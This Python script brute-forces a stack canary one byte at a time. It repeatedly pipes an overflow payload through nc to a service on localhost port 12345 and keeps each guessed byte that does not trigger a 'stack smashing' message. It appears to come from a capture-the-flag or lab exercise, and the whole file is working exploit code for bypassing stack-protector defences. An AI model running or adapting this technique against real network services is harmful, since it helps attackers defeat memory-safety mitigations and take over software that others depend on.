import subprocess
from subprocess import Popen, PIPE, STDOUT
import os
import math
from time import sleep

canary = b'\x00'
for k in range(7):
    for i in range(0, int(0x100)):
        test = i.to_bytes(1,byteorder='big')
        payload = b'a'*10 + canary + test
        p = subprocess.Popen(['nc','127.0.0.1','12345'], stdout=PIPE, stdin=PIPE, stderr=STDOUT)
        output = p.communicate(input=payload)[0]
        if b'smash' not in output:
            canary += test
            break
        #print('payload:', payload)
        #print('output :', output)

print(canary)